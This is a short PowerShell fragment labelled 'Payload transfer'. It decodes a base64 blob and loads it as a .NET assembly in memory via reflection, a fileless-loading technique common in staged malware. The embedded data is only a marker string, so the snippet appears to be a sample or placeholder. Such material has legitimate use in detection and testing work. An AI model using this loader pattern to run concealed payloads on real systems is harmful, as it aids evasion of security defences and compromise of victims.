
# Payload transfer
$AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpoMGlwa2JhZTFy')
Write-Verbose ("Assembly bytes: " + $AssemblyBytes.Length)
[Reflection.Assembly]::Load($AssemblyBytes)
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
